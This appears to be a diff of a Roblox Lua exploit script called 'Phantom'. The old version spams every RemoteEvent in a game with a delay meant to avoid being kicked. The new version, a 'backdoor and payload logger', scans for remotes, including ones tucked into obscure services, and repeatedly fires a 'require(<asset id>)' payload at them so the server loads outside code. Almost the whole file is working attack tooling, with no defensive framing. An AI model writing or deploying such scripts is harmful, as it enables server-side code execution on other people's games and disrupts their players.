@@ -1,212 +1,170 @@
--- [[ PHANTOM ULTIMATE v3: CLASSIC DRAGGABLE ]] --
-local Players = game:GetService("Players")
+-- [[ PHANTOM REMOTE EXECUTOR: BACKDOOR & LOGGER EDITION ]] --
+local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
-local lp = Players.LocalPlayer
+local JointService = game:GetService("JointsService")
+local lp = game:GetService("Players").LocalPlayer
 
-local isRunning = false
-local currentTask = nil
+local activeRemotes = {}
 
--- Cleanup GUI lama
-if CoreGui:FindFirstChild("PhantomClassic_V3") then 
-    CoreGui.PhantomClassic_V3:Destroy() 
-end
-
--- [[ UI ROOT ]] --
+-- [[ UI CONSTRUCTION ]] --
 local ScreenGui = Instance.new("ScreenGui", CoreGui)
-ScreenGui.Name = "PhantomClassic_V3"
+ScreenGui.Name = "PhantomRemoteMethod"
 ScreenGui.ResetOnSpawn = false
-ScreenGui.IgnoreGuiInset = true
 
--- [[ MAIN MENU ]] --
 local Main = Instance.new("Frame", ScreenGui)
-Main.Name = "MainFrame"
-Main.Size = UDim2.new(0, 310, 0, 380)
-Main.Position = UDim2.new(0.5, -155, 0.5, -190)
-Main.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
+Main.Size = UDim2.new(0, 260, 0, 320) 
+Main.Position = UDim2.new(0.5, -130, 0.4, -160)
+Main.BackgroundColor3 = Color3.fromRGB(15, 20, 30)
 Main.BorderSizePixel = 0
-Main.Active = true
-Main.ClipsDescendants = true
+Main.Visible = false
+Instance.new("UICorner", Main)
+local Stroke = Instance.new("UIStroke", Main)
+Stroke.Color = Color3.fromRGB(85, 255, 127)
+Stroke.Thickness = 2
 
-local MainCorner = Instance.new("UICorner", Main)
-MainCorner.CornerRadius = UDim.new(0, 10)
-
-local MainStroke = Instance.new("UIStroke", Main)
-MainStroke.Color = Color3.fromRGB(85, 255, 127)
-MainStroke.Thickness = 1.5
-
--- [[ TOP BAR (AREA GESER) ]] --
-local TopBar = Instance.new("Frame", Main)
-TopBar.Size = UDim2.new(1, 0, 0, 40)
-TopBar.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
-TopBar.BorderSizePixel = 0
-
-local TopCorner = Instance.new("UICorner", TopBar)
-TopCorner.CornerRadius = UDim.new(0, 10)
-
-local Title = Instance.new("TextLabel", TopBar)
-Title.Size = UDim2.new(0.8, 0, 1, 0)
-Title.Position = UDim2.new(0.05, 0, 0, 0)
-Title.Text = "PHANTOM ULTIMATE V3"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+-- [[ HEADER ]] --
+local Title = Instance.new("TextLabel", Main)
+Title.Size = UDim2.new(1, 0, 0, 35)
+Title.Text = "BACKDOOR & PAYLOAD LOGGER"
+Title.TextColor3 = Color3.new(1,1,1)
 Title.Font = Enum.Font.GothamBold
-Title.TextSize = 13
-Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.TextSize = 10
 Title.BackgroundTransparency = 1
 
-local CloseBtn = Instance.new("TextButton", TopBar)
-CloseBtn.Size = UDim2.new(0, 35, 0, 35)
-CloseBtn.Position = UDim2.new(1, -35, 0, 0)
-CloseBtn.Text = "×"
-CloseBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
-CloseBtn.Font = Enum.Font.GothamBold
-CloseBtn.TextSize = 24
-CloseBtn.BackgroundTransparency = 1
+-- [[ SCROLL LIST ]] --
+local Scroll = Instance.new("ScrollingFrame", Main)
+Scroll.Size = UDim2.new(0.9, 0, 0.35, 0)
+Scroll.Position = UDim2.new(0.05, 0, 0.12, 0)
+Scroll.BackgroundColor3 = Color3.fromRGB(10, 12, 18)
+Scroll.BorderSizePixel = 0
+Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+Scroll.ScrollBarThickness = 2
+local ListLayout = Instance.new("UIListLayout", Scroll)
+ListLayout.Padding = UDim.new(0, 5)
 
--- [[ ENGINE CONTROL ]] --
-local ControlBox = Instance.new("Frame", Main)
-ControlBox.Size = UDim2.new(0.9, 0, 0, 60)
-ControlBox.Position = UDim2.new(0.05, 0, 0.15, 0)
-ControlBox.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-Instance.new("UICorner", ControlBox)
+-- [[ LOGGER WINDOW ]] --
+local LogFrame = Instance.new("ScrollingFrame", Main)
+LogFrame.Size = UDim2.new(0.9, 0, 0.3, 0)
+LogFrame.Position = UDim2.new(0.05, 0, 0.52, 0)
+LogFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
+LogFrame.BorderSizePixel = 0
+LogFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+LogFrame.ScrollBarThickness = 2
+local LogList = Instance.new("UIListLayout", LogFrame)
 
-local StatusTxt = Instance.new("TextLabel", ControlBox)
-StatusTxt.Size = UDim2.new(0.6, 0, 1, 0)
-StatusTxt.Position = UDim2.new(0.05, 0, 0, 0)
-StatusTxt.Text = "SYSTEM: STANDBY"
-StatusTxt.TextColor3 = Color3.fromRGB(150, 150, 150)
-StatusTxt.Font = Enum.Font.GothamBold
-StatusTxt.TextSize = 11
-StatusTxt.TextXAlignment = Enum.TextXAlignment.Left
-StatusTxt.BackgroundTransparency = 1
-
-local SwitchBG = Instance.new("Frame", ControlBox)
-SwitchBG.Size = UDim2.new(0, 55, 0, 26)
-SwitchBG.Position = UDim2.new(0.78, 0, 0.5, -13)
-SwitchBG.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
-Instance.new("UICorner", SwitchBG).CornerRadius = UDim.new(1, 0)
-
-local SwitchDot = Instance.new("TextButton", SwitchBG)
-SwitchDot.Size = UDim2.new(0, 20, 0, 20)
-SwitchDot.Position = UDim2.new(0.1, 0, 0.5, -10)
-SwitchDot.BackgroundColor3 = Color3.fromRGB(255, 85, 85)
-SwitchDot.Text = ""
-Instance.new("UICorner", SwitchDot).CornerRadius = UDim.new(1, 0)
-
--- [[ LOGS & PROGRESS ]] --
-local BarBG = Instance.new("Frame", Main)
-BarBG.Size = UDim2.new(0.9, 0, 0, 4)
-BarBG.Position = UDim2.new(0.05, 0, 0.33, 0)
-BarBG.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-local BarFill = Instance.new("Frame", BarBG)
-BarFill.Size = UDim2.new(0, 0, 1, 0)
-BarFill.BackgroundColor3 = Color3.fromRGB(85, 255, 127)
-BarFill.BorderSizePixel = 0
-
-local LogContainer = Instance.new("ScrollingFrame", Main)
-LogContainer.Size = UDim2.new(0.9, 0, 0.6, 0)
-LogContainer.Position = UDim2.new(0.05, 0, 0.37, 0)
-LogContainer.BackgroundColor3 = Color3.fromRGB(5, 5, 8)
-LogContainer.BorderSizePixel = 0
-LogContainer.ScrollBarThickness = 2
-local LogList = Instance.new("UIListLayout", LogContainer)
-LogList.Padding = UDim.new(0, 3)
-
--- [[ DRAG LOGIC ]] --
-local function EnableDrag(obj)
-    local dragging, dragInput, dragStart, startPos
-    obj.InputBegan:Connect(function(input)
-        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
-            dragging = true
-            dragStart = input.Position
-            startPos = Main.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then dragging = false end
-            end)
-        end
-    end)
-    obj.InputChanged:Connect(function(input)
-        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-            dragInput = input
-        end
-    end)
-    UserInputService.InputChanged:Connect(function(input)
-        if input == dragInput and dragging then
-            local delta = input.Position - dragStart
-            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        end
-    end)
-end
-
-local function AddLog(msg, col, prog)
-    local l = Instance.new("TextLabel", LogContainer)
+local function AddLog(text, color)
+    local l = Instance.new("TextLabel", LogFrame)
     l.Size = UDim2.new(1, -10, 0, 18)
     l.BackgroundTransparency = 1
-    l.Text = " [>] " .. msg
-    l.TextColor3 = col or Color3.new(1,1,1)
+    l.Text = "[" .. os.date("%X") .. "] " .. text
+    l.TextColor3 = color or Color3.new(1, 1, 1)
     l.Font = Enum.Font.Code
-    l.TextSize = 11
+    l.TextSize = 10
     l.TextXAlignment = Enum.TextXAlignment.Left
-    if prog then BarFill:TweenSize(UDim2.new(prog, 0, 1, 0), "Out", "Quad", 0.3, true) end
-    LogContainer.CanvasSize = UDim2.new(0, 0, 0, LogList.AbsoluteContentSize.Y)
-    LogContainer.CanvasPosition = Vector2.new(0, LogList.AbsoluteContentSize.Y)
+    LogFrame.CanvasSize = UDim2.new(0, 0, 0, LogList.AbsoluteContentSize.Y)
+    LogFrame.CanvasPosition = Vector2.new(0, LogList.AbsoluteContentSize.Y)
 end
 
--- [[ AUTOMATION LOGIC ]] --
-local function RunEngine()
-    isRunning = true
-    StatusTxt.Text = "SYSTEM: ACTIVE"
-    StatusTxt.TextColor3 = Color3.fromRGB(85, 255, 127)
-    AddLog("Scanning game structure...", Color3.new(1,1,0), 0.1)
+-- [[ ITEM CREATOR ]] --
+local function addRemoteItem(remote, isBackdoor)
+    local Frame = Instance.new("Frame", Scroll)
+    Frame.Size = UDim2.new(1, -6, 0, 35)
+    Frame.BackgroundColor3 = isBackdoor and Color3.fromRGB(40, 20, 20) or Color3.fromRGB(25, 30, 40)
+    Instance.new("UICorner", Frame)
 
-    local remotes = {}
-    for _, v in pairs(game:GetDescendants()) do
-        if v:IsA("RemoteEvent") then table.insert(remotes, v) end
-        if #remotes % 500 == 0 then task.wait() end
-    end
+    local btn = Instance.new("TextButton", Frame)
+    btn.Size = UDim2.new(1, 0, 1, 0)
+    btn.BackgroundTransparency = 1
+    btn.Text = "  " .. (isBackdoor and "[BD] " or "") .. remote.Name
+    btn.TextColor3 = isBackdoor and Color3.fromRGB(255, 100, 100) or Color3.new(1, 1, 1)
+    btn.Font = Enum.Font.SourceSansBold
+    btn.TextSize = 11
+    btn.TextXAlignment = Enum.TextXAlignment.Left
 
-    AddLog("Executing on " .. #remotes .. " remotes...", Color3.new(1,1,1), 0.4)
-
-    for i, remote in pairs(remotes) do
-        if not isRunning then break end
-        pcall(function() remote:FireServer(tick()) end)
-        if i % 4 == 0 then 
-            task.wait(math.random(15, 35)/100) -- Anti-Kick Delay
-            BarFill.Size = UDim2.new(0.4 + ((i/#remotes) * 0.6), 0, 1, 0)
+    local active = false
+    btn.MouseButton1Click:Connect(function()
+        active = not active
+        if active then
+            activeRemotes[remote] = true
+            btn.TextColor3 = Color3.fromRGB(85, 255, 127)
+            AddLog("Activated: " .. remote.Name, Color3.fromRGB(85, 255, 127))
+        else
+            activeRemotes[remote] = nil
+            btn.TextColor3 = isBackdoor and Color3.fromRGB(255, 100, 100) or Color3.new(1, 1, 1)
+            AddLog("Deactivated: " .. remote.Name, Color3.fromRGB(200, 200, 200))
         end
-    end
-
-    if isRunning then
-        AddLog("PROCESS COMPLETED", Color3.fromRGB(85, 255, 127), 1)
-        StatusTxt.Text = "SYSTEM: COMPLETED"
-    end
+    end)
 end
 
--- [[ INTERACTION ]] --
-EnableDrag(TopBar) -- Hanya TopBar yang bisa digunakan untuk menggeser
-
-CloseBtn.MouseButton1Click:Connect(function()
-    if currentTask then task.cancel(currentTask) end
-    ScreenGui:Destroy()
-end)
-
-SwitchDot.MouseButton1Click:Connect(function()
-    if not isRunning then
-        isRunning = true
-        SwitchDot:TweenPosition(UDim2.new(0.6, 0, 0.5, -10), "Out", "Back", 0.3, true)
-        SwitchDot.BackgroundColor3 = Color3.fromRGB(85, 255, 127)
-        currentTask = task.spawn(RunEngine)
-    else
-        isRunning = false
-        if currentTask then task.cancel(currentTask) end
-        SwitchDot:TweenPosition(UDim2.new(0.1, 0, 0.5, -10), "Out", "Back", 0.3, true)
-        SwitchDot.BackgroundColor3 = Color3.fromRGB(255, 85, 85)
-        StatusTxt.Text = "SYSTEM: STANDBY"
-        StatusTxt.TextColor3 = Color3.fromRGB(150, 150, 150)
-        BarFill:TweenSize(UDim2.new(0, 0, 1, 0), "Out", "Quad", 0.3, true)
-        AddLog("Stopped by User.", Color3.new(1,0.4,0.4))
+-- [[ EXECUTION ENGINE ]] --
+task.spawn(function()
+    while true do
+        for remote, _ in pairs(activeRemotes) do
+            pcall(function()
+                -- Payload Backdoor
+                local payload = "require(5021815801):Fire('" .. lp.Name .. "')"
+                remote:FireServer(payload)
+                remote:FireServer(true)
+            end)
+        end
+        task.wait(0.5)
     end
 end)
 
-AddLog("Phantom UI v3 Loaded.", Color3.fromRGB(150,150,150))
+-- [[ SCAN BUTTON ]] --
+local RefBtn = Instance.new("TextButton", Main)
+RefBtn.Size = UDim2.new(0, 234, 0, 30)
+RefBtn.Position = UDim2.new(0.05, 0, 0.85, 0)
+RefBtn.BackgroundColor3 = Color3.fromRGB(35, 40, 50)
+RefBtn.Text = "FULL SCAN (REMOTES + BD)"
+RefBtn.TextColor3 = Color3.fromRGB(85, 255, 127)
+RefBtn.Font = Enum.Font.GothamBold
+RefBtn.TextSize = 10
+Instance.new("UICorner", RefBtn)
+
+RefBtn.MouseButton1Click:Connect(function()
+    for _, c in pairs(Scroll:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end
+    activeRemotes = {}
+    AddLog("Scanning for vulnerabilities...", Color3.fromRGB(255, 255, 100))
+    
+    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+        if v:IsA("RemoteEvent") then addRemoteItem(v, false) end
+    end
+    
+    local locs = {JointService, game:GetService("LogService"), game:GetService("Selection")}
+    for _, loc in pairs(locs) do
+        pcall(function()
+            for _, v in pairs(loc:GetDescendants()) do
+                if v:IsA("RemoteEvent") then addRemoteItem(v, true) end
+            end
+        end)
+    end
+    Scroll.CanvasSize = UDim2.new(0, 0, 0, ListLayout.AbsoluteContentSize.Y + 5)
+    AddLog("Scan Complete. Found " .. #Scroll:GetChildren() .. " remotes.", Color3.fromRGB(85, 255, 127))
+end)
+
+-- [[ OPEN BUTTON ]] --
+local OpenBtn = Instance.new("TextButton", ScreenGui)
+OpenBtn.Size = UDim2.new(0, 45, 0, 45)
+OpenBtn.Position = UDim2.new(0, 20, 0.5, -22)
+OpenBtn.BackgroundColor3 = Color3.fromRGB(15, 20, 30)
+OpenBtn.Text = "LOG"
+OpenBtn.TextColor3 = Color3.fromRGB(85, 255, 127)
+OpenBtn.Font = Enum.Font.GothamBold
+Instance.new("UICorner", OpenBtn).CornerRadius = UDim.new(1, 0)
+Instance.new("UIStroke", OpenBtn).Color = Color3.fromRGB(85, 255, 127)
+OpenBtn.MouseButton1Click:Connect(function() Main.Visible = not Main.Visible end)
+
+-- DRAG LOGIC
+local function drag(o)
+    local s, i, sp
+    o.InputBegan:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = true; i = inp.Position; sp = o.Position end end)
+    o.InputChanged:Connect(function(inp) if s and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then local d = inp.Position - i; o.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y) end end)
+    UserInputService.InputEnded:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = false end end)
+end
+drag(OpenBtn); drag(Main)
+
+AddLog("Phantom Ultimate Loaded.", Color3.fromRGB(85, 255, 127))
+AddLog("Ready to bypass.", Color3.fromRGB(200, 200, 200))
